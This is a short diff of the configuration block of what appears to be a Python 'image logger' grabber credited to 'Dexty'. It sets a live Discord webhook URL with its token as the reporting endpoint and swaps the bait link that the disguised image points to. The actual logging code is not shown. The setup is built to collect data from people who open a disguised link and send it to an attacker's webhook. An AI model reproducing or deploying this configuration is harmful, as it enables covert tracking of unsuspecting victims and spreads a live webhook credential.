@@ -13,7 +13,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1390129310509174814/wHo_y8sHN0H194oAYxmtqa7nad6Xpq9eOHAfEiL6uIGTT7DD0rIhyKe6ThDDeFESupyF",
-    "image": "https://m.soundcloud.com/nitroorient/caseoh-beat", # You can also have a custom image by using a URL argument
+    "image": "https://www.famousbirthdays.com/people/caseoh.html", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
